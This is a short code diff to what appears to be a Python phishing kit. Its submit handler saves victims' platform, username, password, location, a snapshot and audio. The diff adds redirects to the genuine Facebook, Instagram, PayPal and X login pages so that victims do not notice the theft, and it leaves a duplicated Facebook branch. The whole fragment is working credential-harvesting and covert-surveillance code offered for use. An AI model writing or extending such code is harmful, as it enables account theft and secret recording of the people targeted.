@@ -69,9 +69,16 @@ def submit():
     save_data(platform, username, password,
               latitude, longitude, snapshot, audio)
 
-    # Redirect "victim" to real site
     if platform == "Google":
         return redirect("https://accounts.google.com")
+    elif platform == "Facebook":
+        return redirect("https://facebook.com")
+    elif platform == "Instagram":
+        return redirect("https://www.instagram.com/accounts/login/?hl=en")
+    elif platform == "Paypal":
+        return redirect("https://www.paypal.com/in/signin")
+    elif platform == "Twitter-x":
+        return redirect("https://x.com/i/flow/login")
     elif platform == "Facebook":
         return redirect("https://facebook.com")
     return "Success"
